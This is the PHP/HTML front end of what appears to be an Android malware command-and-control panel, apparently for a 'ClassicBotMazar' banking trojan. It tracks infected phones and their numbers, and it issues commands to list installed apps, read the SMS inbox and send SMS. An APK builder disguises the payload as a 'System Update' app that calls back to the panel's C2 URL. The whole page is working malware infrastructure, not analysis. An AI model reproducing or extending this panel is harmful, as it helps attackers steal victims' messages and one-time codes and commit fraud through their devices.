<?php
require_once __DIR__ . '/../database.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pin FREE</title>
    <link rel="stylesheet" href="css/modern.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>Pin FREE</h1>
            <div class="stats">
                <div class="stat-item">
                    <span class="stat-label">Total Devices</span>
                    <span class="stat-value" id="deviceCount">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Online</span>
                    <span class="stat-value" id="onlineCount" style="color:var(--success)">0</span>
                </div>
                <div class="stat-item">
                    <span class="stat-label">Offline</span>
                    <span class="stat-value" id="offlineCount" style="color:var(--error)">0</span>
                </div>
            </div>
        </header>

        <div class="tabs">
            <button class="tab-button active" onclick="switchTab('devices')">Devices</button>
            <button class="tab-button" onclick="switchTab('logs')">Logs</button>
            <button class="tab-button" onclick="switchTab('builder')">APK Builder</button>
        </div>

        <div id="devices-tab" class="tab-content active">
            <div class="card">
                <div class="toolbar">
                    <input type="text" id="deviceSearch" placeholder="Search devices..." onkeyup="filterDevices()">
                    <div class="actions">
                        <button onclick="selectAll()" class="btn-secondary">Select All</button>
                        <button id="sendCommandBtn" onclick="showCommandModal()" class="btn-primary" disabled>Send Command</button>
                    </div>
                </div>
                <div class="table-container">
                    <table id="devicesTable" style="width:100%; border-collapse:collapse">
                        <thead>
                            <tr style="text-align:left; color:var(--text-muted); border-bottom:1px solid var(--border)">
                                <th style="padding:1rem"><input type="checkbox" id="selectAllCheckbox" onchange="toggleSelectAll()"></th>
                                <th>ID</th>
                                <th>Model</th>
                                <th>Numbers</th>
                                <th>Status</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody id="devicesTableBody"></tbody>
                    </table>
                </div>
            </div>
        </div>

        <div id="logs-tab" class="tab-content">
            <div class="card">
                <input type="text" id="logSearch" placeholder="Filter logs..." onkeyup="filterLogs()" style="margin-bottom:1rem">
                <table id="logsTable" style="width:100%">
                    <tbody id="logsTableBody"></tbody>
                </table>
            </div>
        </div>

        <div id="builder-tab" class="tab-content">
            <div class="card" style="max-width: 600px; margin: 0 auto;">
                <h2 style="margin-top:0">APK Configuration</h2>
                <div class="form-group">
                    <label>File Name</label>
                    <input type="text" id="apkName" value="ClassicBotMazar">
                </div>
                <div class="form-group">
                    <label>App Label</label>
                    <input type="text" id="appLabel" value="System Update">
                </div>
                <div class="form-group">
                    <label>WebView URL</label>
                    <input type="text" id="webviewUrl" value="https://google.com">
                </div>
                <div class="form-group">
                    <label>C2 URL</label>
                    <input type="text" id="c2Url" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/c2/">
                </div>
                <button onclick="buildApk()" id="buildBtn" class="btn-primary" style="width:100%">Generate APK</button>
                
                <div id="buildStatus" style="margin-top: 1.5rem; display: none;">
                    <p id="statusMessage"></p>
                    <div style="margin-top:1rem;">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.5rem">
                            <span style="color:var(--text-dim); font-size:0.875rem">Live Build Output</span>
                        </div>
                        <pre id="buildLog"></pre>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Flappy Bird Sidebar -->
    <div id="dinoSidebar" class="dino-sidebar">
        <div class="dino-header">
            <h3>Build in progress...</h3>
            <p>Wait & Play Flappy Bird</p>
        </div>
        <div style="flex: 1; position: relative; overflow: hidden; background: #fff;">
            <iframe id="dinoFrame" src="https://flappybird.io/" frameborder="0" style="width: 100%; height: 100%; border: none;"></iframe>
        </div>
        <div style="padding:1rem; text-align:center; font-size:0.875rem; color:var(--text); border-top: 1px solid var(--border); background: var(--card);">
            The build will finish in the background.
        </div>
    </div>
    </div>

    <div id="commandModal" class="modal">
        <div class="modal-content">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1.5rem;">
                <h2 style="margin:0; font-size:1.125rem;">Send Command</h2>
                <span style="cursor:pointer; color:var(--text-dim);" onclick="closeCommandModal()">&times;</span>
            </div>
            <div id="selectedDevicesInfo" style="font-size:0.875rem; color:var(--text-dim); margin-bottom:1rem;"></div>
            
            <div class="form-group">
                <label>Command Type</label>
                <select id="commandSelect" onchange="updateCommandFields()">
                    <option value="">-- Select Command --</option>
                    <option value="getAppsAll">getAppsAll - Get all installed apps</option>
                    <option value="getSmsInbox">getSmsInbox - Get SMS inbox</option>
                    <option value="sendSMS">sendSMS - Send SMS message</option>
                </select>
            </div>
            
            <div id="sendSMSFields" style="display: none;">
                <div class="form-group">
                    <label>Phone Number</label>
                    <input type="text" id="phoneNumber" placeholder="+38000000000">
                </div>
                <div class="form-group">
                    <label>Message</label>
                    <textarea id="smsMessage" rows="3" placeholder="Enter message..."></textarea>
                </div>
                <div class="form-group">
                    <label>SIM Slot (0 or 1)</label>
                    <input type="number" id="simSlot" value="0" min="0" max="1">
                </div>
            </div>

            <div style="display:flex; gap:1rem; margin-top:2rem;">
                <button onclick="closeCommandModal()" class="btn-primary" style="background:var(--border); flex:1">Cancel</button>
                <button onclick="sendCommand()" class="btn-primary" style="flex:1">Execute</button>
            </div>
        </div>
    </div>

    <script src="js/api.js"></script>
    <script src="js/app-bundle.js"></script>
    <script src="js/main.js"></script>
</body>
</html>

